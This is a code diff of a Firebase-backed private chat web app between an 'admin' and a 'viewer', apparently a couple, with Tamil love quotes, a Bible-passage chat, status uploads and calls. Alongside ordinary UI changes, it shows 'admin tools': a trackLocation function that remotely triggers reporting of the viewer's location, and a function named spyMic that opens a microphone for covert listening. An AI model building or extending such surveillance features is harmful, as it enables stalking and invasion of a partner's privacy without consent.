-function addTruthMessage(o){ if(!o.id)o.id=uid(); if(truthMsgs.some(m=>m.id===o.id))return; const r=!!o.__remote; delete o.__remote; truthMsgs.push(o); saveTruth(); renderTruth(); if(!r){ if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'truth_messages/'+o.id),o).catch(()=>{}); if(bc) bc.postMessage({type:'truth_new'}); } else { if(!$('truthScreen').classList.contains('open')&&o.text) showNotification(peerName+' (Bible)',o.text,peerAvatar); } }
+function addTruthMessage(o){ if(!o.id)o.id=uid(); if(truthMsgs.some(m=>m.id===o.id))return; const r=!!o.__remote; delete o.__remote; truthMsgs.push(o); saveTruth(); renderTruth(); if(!r){ if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'truth_messages/'+o.id),o).catch(()=>{}); if(bc) bc.postMessage({type:'truth_new'}); } else { if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'truth_messages/'+o.id+'/seen'),true).catch(()=>{}); if(!$('truthScreen').classList.contains('open')&&o.text) showNotification(peerName+' (Bible)',o.text,peerAvatar); } }
 function renderTruth(){ 
   const box=$('truthBox'); 
   box.innerHTML=truthMsgs.length?'':`<div style="text-align:center;color:#aaa;font-size:12px;margin-top:40px;">No passages yet 👋</div>`; 
@@ -505,7 +609,12 @@ function renderTruth(){
     if(m.text) d.append(document.createTextNode(m.text)); 
     if(m.url){ const img=document.createElement('img'); img.src=m.url; img.style.cssText='display:block;max-width:160px;border-radius:12px;margin-top:6px;border:2px solid white;'; d.append(img);}
     d.id = 'truth_' + m.id;
-    let t; d.addEventListener('mousedown',()=>t=setTimeout(()=>openDeleteSheet(m.id,'truth'),600)); d.addEventListener('mouseup',()=>clearTimeout(t)); d.addEventListener('touchstart',()=>t=setTimeout(()=>openDeleteSheet(m.id,'truth'),600)); d.addEventListener('touchend',()=>clearTimeout(t)); d.addEventListener('touchmove',()=>clearTimeout(t)); box.appendChild(d); 
+    let pressTimer;
+    d.addEventListener('pointerdown', (e) => { pressTimer = setTimeout(() => openDeleteSheet(m.id, 'truth'), 500); });
+    d.addEventListener('pointerup', () => clearTimeout(pressTimer));
+    d.addEventListener('pointerleave', () => clearTimeout(pressTimer));
+    d.addEventListener('contextmenu', e => e.preventDefault()); 
+    box.appendChild(d); 
   }); 
   box.scrollTop=box.scrollHeight; 
 }
@@ -515,47 +624,52 @@ let pId=null, pType='msg';
 function openDeleteSheet(id,type){ pId=id; pType=type; $('delSheet').style.display='flex'; }
 function closeDelSheet(){ $('delSheet').style.display='none'; }
 window.closeDelSheet=closeDelSheet;
-window.doDelete=(mode)=>{ const id=pId, type=pType; closeDelSheet(); if(!id)return; if(type==='msg'){ msgs=msgs.filter(m=>m.id!==id); save(); document.getElementById('msg_'+id)?.remove(); renderList(); if(mode==='everyone'&&window.FB) window.FB.remove(window.FB.ref(window.FB.db,'messages/'+id)).catch(()=>{}); } else { truthMsgs=truthMsgs.filter(m=>m.id!==id); saveTruth(); document.getElementById('truth_'+id)?.remove(); if(mode==='everyone'&&window.FB) window.FB.remove(window.FB.ref(window.FB.db,'truth_messages/'+id)).catch(()=>{}); } };
+window.doDelete=(mode)=>{ const id=pId, type=pType; closeDelSheet(); if(!id)return; if(type==='msg'){ msgs=msgs.filter(m=>m.id!==id); save(); document.getElementById('msg_'+id)?.remove(); if(mode==='everyone'&&window.FB) window.FB.remove(window.FB.ref(window.FB.db,'messages/'+id)).catch(()=>{}); } else { truthMsgs=truthMsgs.filter(m=>m.id!==id); saveTruth(); document.getElementById('truth_'+id)?.remove(); if(mode==='everyone'&&window.FB) window.FB.remove(window.FB.ref(window.FB.db,'truth_messages/'+id)).catch(()=>{}); } };
 
-/* CALENDAR & LOVE LEVEL */
-let selectedDate = new Date(), selectedDay = selectedDate.getDate();
-let reminders = []; try { reminders = JSON.parse(localStorage.getItem('chat_reminders') || '[]'); } catch(e) { reminders = []; }
-if($('reminderCount')) $('reminderCount').textContent = reminders.length;
-window.renderCalendar = () => {
-  const d = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), 1);
-  const end = new Date(selectedDate.getFullYear(), selectedDate.getMonth() + 1, 0);
-  $('calMonthYear').textContent = d.toLocaleString('default', { month: 'long', year: 'numeric' });
-  let html = '<span>S</span><span>M</span><span>T</span><span>W</span><span>T</span><span>F</span><span>S</span>';
-  for (let i = 0; i < d.getDay(); i++) html += '<div></div>';
-  for (let i = 1; i <= end.getDate(); i++) html += `<div class="${i === selectedDay ? 'active' : ''}" onclick="selectDay(${i}, this)">${i}</div>`;
-  $('calGrid').innerHTML = html;
+/* STATUS LOGIC */
+window.viewStatus = (role) => {
+    const statusImg = role === 'admin' ? localStorage.getItem('status_admin') : localStorage.getItem('status_viewer');
+    if (statusImg) {
+        $('statusImage').src = statusImg;
+        $('statusViewer').style.display = 'flex';
+    } else if (role !== ROLE) {
+        alert('No status available');
+    }
 };
-window.selectDay = (day, el) => {
-  selectedDay = day;
-  document.querySelectorAll('.calendar-grid div').forEach(d => d.classList.remove('active'));
-  el.classList.add('active');
+
+$('statusInp').onchange = (e) => {
+    const file = e.target.files[0]; if(!file) return;
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+        const base64 = ev.target.result;
+        localStorage.setItem('status_admin', base64);
+        if(window.FB) window.FB.set(window.FB.ref(window.FB.db, 'statuses/admin'), base64).catch(()=>{});
+        alert('Status uploaded!');
+    };
+    reader.readAsDataURL(file);
 };
-window.openCalendar = () => { renderCalendar(); $('calendarModal').style.display = 'flex'; };
-window.saveReminder = () => {
-  const text = $('reminderInput').value.trim();
-  if (!text) return alert('Enter reminder');
-  reminders.push({ date: selectedDay, text });
-  localStorage.setItem('chat_reminders', JSON.stringify(reminders));
-  $('reminderCount').textContent = reminders.length;
-  $('reminderInput').value = '';
-  $('calendarModal').style.display = 'none';
-  alert('Reminder Saved!');
+
+/* LOVE SCREEN & QUOTES */
+const loveQuotes = [
+    { text: "உன் நினைவுகளில் தொடங்கி, உன் சிரிப்பில் முடிகிறது என் ஒவ்வொரு நாளும்...", author: "Sedhu" },
+    { text: "துர்கா... உன் பெயரை சொல்லும் போதே என் இதயம் ஒரு பாட்டு பாடுகிறது.", author: "Sedhu" },
+    { text: "உலகத்துல எத்தனை பேர் இருந்தாலும், என் உலகமே நீ தான் துர்கா.", author: "Sedhu" },
+    { text: "உன் கண்களில் நான் விழுந்தேன், எழுந்திருக்க விருப்பமில்லை.", author: "Sedhu" },
+    { text: "நிலா அழகு, மலர் அழகு, ஆனால் உன் சிரிப்புக்கு முன்னாடி எல்லாம் வெறும் பூஜ்யம்.", author: "Sedhu" }
+];
+let quoteIndex = 0;
+window.nextQuote = (isOpen=false) => {
+    if(!isOpen) quoteIndex = (quoteIndex + 1) % loveQuotes.length;
+    const q = loveQuotes[quoteIndex];
+    $('quoteText').textContent = `"${q.text}"`;
+    $('quoteAuthor').textContent = `- ${q.author}`;
+    showFloatingHearts();
 };
+
 const loveLevels = [50, 70, 85, 99];
 let loveIndex = parseInt(localStorage.getItem('chat_love_index'), 10);
 if (!Number.isFinite(loveIndex) || loveIndex < 0 || loveIndex >= loveLevels.length) loveIndex = 1;
 if ($('loveLevel')) $('loveLevel').textContent = loveLevels[loveIndex] + '%';
-window.changeLove = () => {
-  loveIndex = (loveIndex + 1) % loveLevels.length;
-  $('loveLevel').textContent = loveLevels[loveIndex] + '%';
-  localStorage.setItem('chat_love_index', loveIndex);
-  showFloatingHearts();
-};
 function showFloatingHearts() {
   const container = document.getElementById('heartsContainer');
   for (let i = 0; i < 5; i++) {
@@ -569,7 +683,14 @@ function showFloatingHearts() {
 function attachFB(){
   if(!window.FB) return; const {db,ref,onChildAdded,onValue,onChildChanged,onChildRemoved,set,remove,onDisconnect}=window.FB;
   
-  // Location listener
+  onValue(ref(db,'statuses/viewer'), s => {
+      if(s.val()) {
+          localStorage.setItem('status_viewer', s.val());
+          peerStatus = s.val();
+          updatePeerUI();
+      }
+  });
+  
   onValue(ref(db,'locations/viewer'), s=>{
       const loc = s.val();
       if(loc && loc.lat && loc.lng) {
@@ -579,10 +700,15 @@ function attachFB(){
   });
 
   onValue(ref(db,'profiles/'+PEER),s=>{ const p=s.val(); if(p){ if(p.name)peerName=p.name; if(p.avatar)peerAvatar=p.avatar; peerState.online=!!p.online; } updatePeerUI(); });
+  
+  // MESSAGES
   onChildAdded(ref(db,'messages'),s=>{const m=s.val(); if(m&&m.id) addMessage({...m,__remote:true});});
   onChildChanged(ref(db,'messages'),s=>{const m=s.val(); if(!m||!m.id)return; const e=msgs.find(x=>x.id===m.id); if(e&&e.seen!==!!m.seen){e.seen=!!m.seen;save(); const tick=document.querySelector(`#msg_${m.id} .seen-tick`); if(tick){tick.textContent='✓✓';tick.style.color='#4ade80';}}});
-  onChildRemoved(ref(db,'messages'),s=>{const m=s.val(); if(!m)return; msgs=msgs.filter(x=>x.id!==m.id);save(); document.getElementById('msg_'+m.id)?.remove(); renderList();});
+  onChildRemoved(ref(db,'messages'),s=>{const m=s.val(); if(!m)return; msgs=msgs.filter(x=>x.id!==m.id);save(); document.getElementById('msg_'+m.id)?.remove();});
+  
+  // TRUTH MESSAGES
   onChildAdded(ref(db,'truth_messages'),s=>{const m=s.val(); if(m&&m.id) addTruthMessage({...m,__remote:true});});
+  onChildChanged(ref(db,'truth_messages'),s=>{const m=s.val(); if(!m||!m.id)return; const e=truthMsgs.find(x=>x.id===m.id); if(e&&e.seen!==!!m.seen){e.seen=!!m.seen;saveTruth(); const tick=document.querySelector(`#truth_${m.id} .seen-tick`); if(tick){tick.textContent='✓✓';tick.style.color='#4ade80';}}});
   onChildRemoved(ref(db,'truth_messages'),s=>{const m=s.val(); if(!m)return; truthMsgs=truthMsgs.filter(x=>x.id!==m.id);saveTruth(); document.getElementById('truth_'+m.id)?.remove();});
   
   onValue(ref(db,'typing/'+PEER), s=>{
@@ -603,7 +729,6 @@ window.onTyping = () => {
     window.tTimer = setTimeout(()=>{ if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'typing/'+ROLE),{typing:false}).catch(()=>{}); }, 1500);
 };
 
-/* ADMIN TOOLS LOGIC */
 window.trackLocation = () => {
     if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'track_location'), { trigger: Date.now() }).catch(()=>{});
     alert("Location request sent! Map will open automatically.");
@@ -626,7 +751,6 @@ window.spyMic = async () => {
     } catch(e) { alert('Error opening mic'); }
 };
 
-/* WEBRTC CALLS */
 let pc=null, localStream=null, currentCallKind='voice', pendingCandidates=[], incomingTimer;
 const ICE={iceServers:[{urls:'stun:stun.l.google.com:19302'}]};
 function pushSignal(to,p){ const sid=uid(); if(bc) bc.postMessage({type:'signal',node:{sid,to,from:ROLE,payload:p}}); if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'signaling/'+sid),{sid,to,from:ROLE,payload:p}).catch(()=>{}); }
@@ -650,5 +774,5 @@ function cleanup(){ $('callOverlay').style.display='none'; if(pc){pc.close();pc=
 
 window.clearChat=async()=>{ if(!confirm('Clear all?')) return; msgs=[];save();render(); if(window.FB){ try{ await window.FB.remove(window.FB.ref(window.FB.db,'messages')); }catch(e){} } };
 
-load(); loadTruth(); render(); renderTruth(); renderList(); checkLogin();
+load(); loadTruth(); render(); renderTruth(); checkLogin();
 </script></body></html>
